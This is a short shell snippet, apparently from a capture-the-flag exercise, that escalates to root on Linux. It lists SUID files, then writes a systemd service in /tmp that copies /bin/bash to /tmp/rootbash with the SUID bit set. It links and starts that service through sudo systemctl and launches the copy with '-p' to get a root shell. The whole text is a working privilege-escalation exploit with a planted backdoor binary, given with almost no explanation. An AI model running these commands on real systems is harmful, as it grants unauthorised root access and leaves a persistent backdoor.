find / -perm -u=s -type f 2>/dev/null





cat > /tmp/ctf.service <<'EOF'
[Unit]
Description=ctf suid shell

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF

# link and start (systemctl runs as root so it creates the symlink in /etc)
sudo systemctl link /tmp/ctf.service
sudo systemctl daemon-reload
sudo systemctl start ctf.service
# then
/tmp/rootbash -p
